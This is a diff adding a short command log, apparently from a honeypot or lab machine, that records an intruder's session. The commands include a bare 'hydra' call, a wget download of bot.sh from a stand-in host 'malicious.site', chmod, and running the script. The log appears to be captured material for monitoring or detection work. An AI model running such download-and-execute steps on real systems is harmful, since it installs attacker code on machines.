@@ -1,0 +1,13 @@
+2026-01-11T03:35:28.813356Z | IP=192.168.56.3 | user=null | cmd=whoami\
+2026-01-11T03:35:31.206532Z | IP=192.168.56.3 | user=null | cmd=whoami\
+2026-01-11T03:35:38.316235Z | IP=192.168.56.3 | user=null | cmd=whoami
+2026-01-11T03:35:46.556402Z | IP=192.168.56.3 | user=null | cmd=mkdir malware
+2026-01-11T03:35:48.537299Z | IP=192.168.56.3 | user=null | cmd=ls
+2026-01-11T03:36:25.341988Z | IP=192.168.56.3 | user=null | cmd=hydra 
+2026-01-11T03:37:16.829069Z | IP=192.168.56.3 | user=null | cmd=wget http://malicious.site/bot.sh
+2026-01-11T03:37:27.289753Z | IP=192.168.56.3 | user=null | cmd=chmod +x bot.sh
+2026-01-11T03:37:30.380104Z | IP=192.168.56.3 | user=null | cmd=ls
+2026-01-11T03:37:34.127800Z | IP=192.168.56.3 | user=null | cmd=cd malware/
+2026-01-11T03:37:35.534893Z | IP=192.168.56.3 | user=null | cmd=ls
+2026-01-11T03:37:44.938060Z | IP=192.168.56.3 | user=null | cmd=./bot.sh
+2026-01-11T03:38:04.689721Z | IP=192.168.56.3 | user=null | cmd=exit
